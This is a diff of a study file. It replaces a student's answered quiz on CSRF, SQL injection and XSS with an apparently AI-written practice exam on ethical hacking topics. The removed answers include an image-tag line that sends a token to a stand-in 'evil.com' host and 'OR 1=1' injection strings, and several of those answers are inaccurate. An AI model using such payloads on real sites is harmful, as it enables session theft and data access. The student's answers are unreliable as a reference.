@@ -1,115 +1,233 @@
-Here is a 25-question open-answer quiz based on the three slidedecks provided.
+Here is a practice exam file based on your slides. As requested, I have focused heavily on the topics that did not have existing quizzes (Intro, Firewalls, Web Security, Smart Contracts, and Reverse Engineering) while providing a few review questions for the others.
 
-### Module 1: Cross-Site Request Forgery (CSRF)
+Save this as a `.md` file or simply write your answers in a text editor. When you are ready, paste your answers back to me, and I will correct them.
 
-**1.** What is the specific behavior of web browsers regarding cookies that allows CSRF attacks to happen?
+---
 
-When going from site A to B, if site A operates with cookies, they are saved in the browser. If site B is evil, then they can create a request (back to A), and since the browser sees that the request is going to A, where it has stored cookies, it attatches them aswell. B can then create a request s.t. that request does some bad stuff (like delete account or add samy is my hero to bio)
+# Ethical Hacking & Security Practice Exam
 
-**2.** Explain the difference between a "same-site request" and a "cross-site request."
+## Section 1: Introduction to Ethical Hacking & Threat Modeling
 
-sime-site: request from A.com/1 to A.com/api/get_somthing
-cross-site: request from A.com/1 to B.com/something
+_(Focus Area: No previous quiz provided)_
 
-**3.** In a GET-based CSRF attack, name two HTML tags an attacker can use to trigger a request to a victim's bank without the victim's knowledge.
+**Q1.1 (Short Answer)**
+Define the difference between a **Red Team** and a **Blue Team** in the context of a company's security exercise.
 
-```html
-<img src="evil.com/evil?c=token" /> <iframe src="evil"></iframe>
-```
+**Q1.2 (Multiple Choice)**
+In the context of Threat Modeling, what does the acronym **STRIDE** stand for?
+a. Security, Threat, Risk, Integrity, Denial, Elevation
+b. Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege
+c. Spoofing, Testing, Risk, Information Disclosure, Detection, Elevation of Privilege
+d. Scanning, Targeting, Reconnaissance, Intrusion, Data Exfiltration, Evasion
 
-**4.** How does an attacker execute a POST-based CSRF attack without requiring the user to manually click a "Submit" button?
+**Q1.3 (Short Answer)**
+What is the fundamental formula used to calculate **Risk** in threat analysis?
 
-something like this?
+**Q1.4 (Multiple Choice)**
+Which of the following is an **asset-centric** approach to threat modeling?
+a. Creating a list of threat actors (motive, means, opportunity).
+b. Drawing a diagram of the application and ranking threats using STRIDE.
+c. Creating a list of assets, drawing data flows, and checking for threats against each element.
+d. Using the OWASP Top 10 to blindly patch code.
 
-```js
-window.onload() {do_evil()}
-```
+**Q1.5 (Short Answer)**
+Explain the concept of **Hacktivism**. Which category of hacker (Hat color) is most often associated with it?
 
-or a eventlistener listening to load
+---
 
-**5.** Why is the "Referer" HTTP header considered an unreliable countermeasure against CSRF?
+## Section 2: Sniffing, Spoofing, and Layer 4 Attacks
 
-may be spoofed, may be missing, me be misleading.
+_(Review Area)_
 
-**6.** How does the "Secret Token" countermeasure prevent an attacker from forging a valid request?
+**Q2.1 (Short Answer)**
+In a TCP Session Hijacking attack, what specific piece of information must the attacker successfully guess or sniff to inject malicious packets into an active connection?
 
-?
+**Q2.2 (Multiple Choice)**
+Which of the following is a countermeasure against **Source Routing Attacks**?
+a. Enforcing a minimum packet size.
+b. Discarding packets that have the source routing option enabled.
+c. using a Switch instead of a Hub.
+d. Randomizing the Initial Sequence Number (ISN).
 
-**7.** Why can't an attacker's website read the Secret Token from the target website? (Which browser policy prevents this?)
+**Q2.3 (Short Answer)**
+Why is a random Initial Sequence Number (ISN) crucial for TCP security?
 
-**8.** When using "Same-Site Cookies" as a defense, what is the difference between the `Strict` and `Lax` settings?
+---
 
-strict: no CS requests
-lax: only get CS requests (ie. not POST CS requests)
+## Section 3: Firewall Security
 
-### Module 2: SQL Injection (SQLi)
+_(Focus Area: No previous quiz provided)_
 
-**9.** What is the fundamental cause of SQL Injection (and other injection vulnerabilities like XSS)?
+**Q3.1 (Multiple Choice)**
+What is the primary purpose of a **Demilitarized Zone (DMZ)**?
+a. To encrypt all traffic leaving the internal network.
+b. To block all traffic from the internet.
+c. To create a network segment connecting the untrusted world to the internal private network, hosting public-facing servers.
+d. To allow the Red Team to attack without damaging the real network.
 
-Lack of sanitation on user input. Users can comment out parts of code and replace logic with things that is always true (e.g. 1=1)
+**Q3.2 (Short Answer)**
+Explain the difference between a **Default Discard** policy and a **Default Forward** policy in packet filtering. Which is more secure?
 
-**10.** In a standard SQL query, what is the purpose of the `WHERE` clause?
+**Q3.3 (Multiple Choice)**
+An attacker deliberately creates very small IP packets to split the TCP header across multiple fragments. The goal is to push the TCP flags into the second fragment to bypass a firewall that only checks the first fragment. What is this attack called?
+a. Source Routing Attack
+b. Tiny Fragments Attack
+c. IP Spoofing
+d. SYN Flood
 
-A logic expression, to find _something_, where that logical expression is true e.g. `WHERE name = "Alice"`
+**Q3.4 (Short Answer)**
+In the context of Packet Filtering, what are the three standard actions a firewall can take regarding a packet?
 
-**11.** Why is the predicate `1=1` (or `'1'='1`) frequently used in SQL injection attacks?
+**Q3.5 (Multiple Choice)**
+Which limitation is specific to a standard **Packet Filtering Firewall**?
+a. It cannot inspect the payload of the application layer (e.g., HTTP content).
+b. It cannot check IP addresses.
+c. It introduces too much latency for modern networks.
+d. It cannot be placed on a router.
 
-cuz its allways true -> can be used to as `password=prob_wrong_input or 1=1 --` which is true regardless if the guessed input is correct or not
+---
 
-**12.** Name two different syntax styles used to create comments in MySQL.
+## Section 4: Web Security (XSS, CSRF, SQLi)
 
-1. `# or --`
-2. `/* multiple lines */`
+_(Focus Area: No previous quiz provided)_
 
-**13.** Explain how an attacker can use an `UPDATE` statement injection to change a user's password in the database.
+**Q4.1 (Multiple Choice)**
+Which type of **XSS** (Cross-Site Scripting) involves the malicious script being permanently saved on the target server's database?
+a. Reflected XSS
+b. DOM-Based XSS
+c. Stored XSS
+d. Server-Side XSS
 
-Makes it possible to change (update) the data:
+**Q4.2 (Short Answer)**
+In a **DOM-Based XSS** attack, does the malicious payload necessarily reach the server? Explain briefly why or why not.
 
-```sql
-CHANGE users SET somethign where case1
-```
+**Q4.3 (Short Answer)**
+What is the "Fundamental Cause" of both SQL Injection and XSS attacks?
 
-if case1 can be manipulated, suddenly able to change all
+**Q4.4 (Multiple Choice)**
+You are reviewing a PHP login script:
+`$sql = "SELECT * FROM users WHERE name='$name' AND pass='$pass'";`
+If an attacker inputs `' OR '1'='1` into the name field, what happens to the query logic?
+a. The database crashes.
+b. The query becomes `SELECT * FROM users WHERE name='' OR '1'='1' ...`, effectively returning true for all rows (or the first row).
+c. The query fails because of a syntax error.
+d. The password field is automatically encrypted.
 
-**14.** What is the specific function of `mysqli::real_escape_string()` in PHP?
+**Q4.5 (Multiple Choice)**
+Which of the following is the most effective defense against **SQL Injection**?
+a. Sanitizing input by removing specific characters like `'` and `-`.
+b. Using Prepared Statements (separation of code and data).
+c. Hiding the database error messages.
+d. Using a complex database password.
 
-A sanitation tool, escapes troublesome chars
+**Q4.6 (Short Answer)**
+Describe how a **CSRF (Cross-Site Request Forgery)** attack works. Why does the server accept the malicious request?
 
-**15.** Describe the main idea behind "Prepared Statements."
+**Q4.7 (Multiple Choice)**
+Which of the following is a valid mitigation technique for **CSRF**?
+a. Using HTTPS for all connections.
+b. Input validation on the client side.
+c. Implementing Anti-CSRF Tokens (Secret Tokens) in forms.
+d. Disabling Javascript in the browser.
 
-Input validation. All user input is placed correctly, and all user input is checked if are correct (no longer pssible to comment out parsts of the "check")
+**Q4.8 (Multiple Choice)**
+Regarding **SameSite Cookies**, which setting ensures the cookie is _never_ sent with cross-site requests?
+a. SameSite=Lax
+b. SameSite=Strict
+c. SameSite=None
+d. SameSite=Secure
 
-**16.** When using Prepared Statements, the database receives information via two separate channels. What are they?
+---
 
-1. the expression i.e the sql command e.g. select \* from table where ...
-2. the input, ie. what to place in the placeholders
+## Section 5: Smart Contracts Security
 
-**17.** Why does a Prepared Statement prevent an attacker's input (e.g., `OR '1'='1`) from being executed as code?
+_(Focus Area: No previous quiz provided)_
 
-The data and the code is sent seperatly. The code (query) is strucured, then the data is placed into the prepared statement. No part of the data is executable, so the string 1=1 is just read as the string s.t. it checks if something == '1=1' (simply put)
+**Q5.1 (Short Answer)**
+What is the key difference between a generic **Distributed Ledger Technology (DLT)** and a **Blockchain**?
 
-### Module 3: Cross-Site Scripting (XSS)
+**Q5.2 (Multiple Choice)**
+Smart contracts on Ethereum are compiled into bytecode and executed by the:
+a. Miner's CPU directly.
+b. Ethereum Virtual Machine (EVM).
+c. Web3 JavaScript API.
+d. Proof of Work algorithm.
 
-**18.** In an XSS attack, where is the malicious script executed?
+**Q5.3 (Short Answer)**
+Why is "Immutability" in blockchain both a security feature and a security risk when it comes to Smart Contracts?
 
-On the victims device
+**Q5.4 (Multiple Choice)**
+What triggers the execution of a function within a Smart Contract?
+a. A transaction sent to the contract's address with specific data.
+b. The mining of a new block automatically triggers all contracts.
+c. A manual approval by the Ethereum Foundation.
+d. A CRON job running on the blockchain nodes.
 
-**19.** Describe the workflow of a **Stored XSS** attack.
+---
 
-The attacker is able to write mal code on the server/db and is then served to users from there.
+## Section 6: Reverse Engineering
 
-**20.** Why is **Reflected XSS** considered "non-persistent"?
+_(Focus Area: No previous quiz provided)_
 
-**21.** What are the two required components for a **DOM-based XSS** vulnerability to exist?
+**Q6.1 (Multiple Choice)**
+Which register in the x86 architecture points to the **top of the stack**?
+a. EBP / RBP
+b. EIP / RIP
+c. ESP / RSP
+d. EAX / RAX
 
-^^give me a proper explenation on these
+**Q6.2 (Short Answer)**
+Explain the difference between **Static Analysis** and **Dynamic Analysis**.
 
-**22.** Why are server-side static analysis tools often unable to detect DOM-based XSS vulnerabilities?
+**Q6.3 (Multiple Choice)**
+Which assembly instruction performs a subtraction but _throws away the result_, only updating the FLAGS register (often used before a jump)?
+a. SUB
+b. MOV
+c. LEA
+d. CMP
 
-Because the mal-code is stored as user-data or in somewhere code issnt supposed to run, therefore shouldnt be needed to checked. The actuall runnign of code is done user-side, and therefore cannot be logged/seen
+**Q6.4 (Short Answer)**
+In the context of the ELF format, what is the purpose of the `.text` section?
 
-**23.** In the context of DOM XSS, `document.location.hash` is an example of what?
-**24.** In the context of DOM XSS, `document.write()` is an example of what?
-**25.** If a developer wants to prevent XSS, they should encode special characters. What does encoding tell the parser to do with those characters?
+**Q6.5 (Multiple Choice)**
+What is the purpose of the **Function Prologue** (e.g., `push ebp; mov ebp, esp`)?
+a. To clean up the stack before returning.
+b. To set up a new stack frame for the called function.
+c. To jump to the next instruction.
+d. To allocate memory on the heap.
 
-change them to safe chars e.g. < can be written in a special way with some weird charachter combination, but displayes the same
+**Q6.6 (Short Answer)**
+If you see the instruction `XOR EAX, EAX`, what is the resulting value in the EAX register?
+
+**Q6.7 (Multiple Choice)**
+Why is **Decompilation** (converting binary to source code) considered generally "undecidable" or difficult?
+a. Because assembly language is too complex.
+b. Because high-level information (variable names, comments, structure) is lost during compilation.
+c. Because disassemblers are illegal.
+d. Because modern CPUs encrypt the binary.
+
+---
+
+## Section 7: Software Security (Buffer Overflow & Protections)
+
+_(Focus Area: Partial previous coverage, adding depth)_
+
+**Q7.1 (Short Answer)**
+Explain how **Stack Canaries** protect against buffer overflows. What happens if the canary value is modified?
+
+**Q7.2 (Multiple Choice)**
+If a system implements **ASLR (Address Space Layout Randomization)**, which part of the attack becomes significantly more difficult?
+a. Injecting the shellcode.
+b. Finding the address of the stack/shellcode to jump to.
+c. Crashing the program.
+d. Generating a NOP sled.
+
+**Q7.3 (Multiple Choice)**
+In a **Format String Attack**, what does the `%n` format specifier do?
+a. Prints the number of characters written so far.
+b. Reads a hex value from the stack.
+c. Writes the number of characters printed so far into the memory address pointed to by the argument.
+d. Crashes the program immediately.
+
+**Q7.4 (Short Answer)**
+Why is `strcpy()` considered unsafe compared to `strncpy()`?
